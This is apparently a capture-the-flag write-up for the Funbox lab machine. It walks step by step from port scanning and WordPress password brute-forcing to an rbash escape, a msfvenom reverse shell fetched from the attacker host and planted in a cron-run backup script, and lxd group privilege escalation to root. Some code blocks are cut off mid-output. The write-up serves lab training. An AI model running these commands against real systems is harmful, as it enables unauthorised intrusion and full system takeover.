[Details](https://www.vulnhub.com/entry/funbox-1,518/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to detect tha attack surface of the target.

## port scan
```bash
$ nmap -Pn -p21,22,80 -sV 192.168.203.77
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 09:37 CEST
Nmap scan report for 192.168.203.77
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
```

## web server
Accessing the web service via the IP shows that we need to add an entry to our `/etc/hosts` file.
```http

# exploitation

After we added `funbox.fritz.box` to our `/etc/hosts` we continue by doing a `wpscan`.
```bash
$ wpscan --url http://funbox.fritz.box/ --wp-content-dir wp-admin --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.

Wait a moment... the credentials should also work for `ssh`.

# post exploitation
## `rbash` escape
Trying to change the directory shows that we are in a restricted bash.
```bash
joe@funbox:~$ cd ..
-rbash: cd: restricted
```

Escape the restriction.  
We are able to execute `vim`. This is is an easy one.
```bash
joe@funbox:~$ vim
:!sh
$ id
uid=1001(joe) gid=1001(joe) groups=1001(joe)
$ cd ..
$ pwd
/home
```

> We escaped.
{: .prompt-info }

## privilege escalation
After we escaped the `rbash` we can have a look what other users exist on the system
```bash
joe@funbox:/home$ ls
funny  joe
```

There is a user named `funny`.
```bash
joe@funbox:/home/funny$ ls -lsah
total 47M
4.0K drwxr-xr-x 3 funny funny 4.0K Aug 21  2020 .

> There is a file named `.backup.sh` which indicates that this file is executed regularly (probably by a cronjob). And we are able to change the content of the file as we have write permissions.
{: .prompt-info }

So we have the chance to become user `funny`.  
Therefore we generate a simple reverse shell using `msfvenom`.
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.248 LPORT=80 -f elf > abc                                              
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Then we upload the binary to our target.  
Start web server on attacker machine.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Upload to target by using `wget` on the target.
```bash
joe@funbox:/tmp$ wget http://192.168.45.248/abc
--2023-08-22 08:09:58--  http://192.168.45.248/abc

2023-08-22 08:09:58 (282 KB/s) - âabcâ saved [194/194]

joe@funbox:/tmp$ chmod +x abc
```

We start the reverse shell listener on our attacker machine.
```bash
$ nc -lvp 80    
listening on [any] 80 ...
```

Now we change the content of `.backup.sh` by using an editor on the target like `nano`.  
The content then should look like this.
```bash
joe@funbox:/tmp$ cat /home/funny/.backup.sh 
#!/bin/bash
/tmp/abc
tar -cf /home/funny/html.tar /var/www/html
```

After a minute we get a connection.
```bash
$ nc -lvp 80    
listening on [any] 80 ...
connect to [192.168.45.248] from funbox.fritz.box [192.168.203.77] 33228

```

> It worked!
{: .prompt-info }

Upgrading to a full `tty` shell.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
funny@funbox:/home/funny$ export TERM=xterm
export TERM=xterm
funny@funbox:/home/funny$
```

Having a closer look at the users groups shows that we are in the `lxd` group.  
After a quick research we see that we can exploit this to get `root`.  
(`https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation`)

On the attacker machine.
```bash
$ sudo apt update
$ sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
$ git clone https://github.com/lxc/distrobuilder
$ cd distrobuilder
$ make
$ mkdir -p $HOME/ContainerImages/alpine/
$ cd $HOME/ContainerImages/alpine/
$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

Upload the created files `lxd.tar.xz` and `rootfs.squashfs` to the target using a simple web server like we uploaded the other stuff before. 
  
On the target machine.
```bash
funny@funbox:/tmp$ wget http://192.168.45.248/lxd.tar.xz
wget http://192.168.45.248/lxd.tar.xz

```

Executing `lxc` on the target shows that there is a path missing in the environment. Lets fix that.
```bash
funny@funbox:/tmp$ lxc
lxc
Command 'lxc' is available in '/snap/bin/lxc'
The command could not be located because '/snap/bin' is not included in the PATH environment variable.
lxc: command not found
funny@funbox:/tmp$ export PATH=$PATH:/snap/bin
export PATH=$PATH:/snap/bin
funny@funbox:/tmp$ lxc
lxc
Description:
  Command line client for LXD

  All of LXD's features can be driven through the various commands below.
  For help with any of those, simply call them with --help.

Usage:
  lxc [command]
...
```

Now lets continue with the escalation.
```bash
funny@funbox:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
funny@funbox:/tmp$ lxc init alpine privesc -c security.privileged=true
funny@funbox:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
funny@funbox:/tmp$ lxc start privesc
funny@funbox:/tmp$ lxc exec privesc /bin/sh
# id

```

> `root`!
{: .prompt-info }

## get second flag
Now lets read the `root` flag.
```bash
# cd /mnt/root/root
/mnt/root/root # ls proof.txt
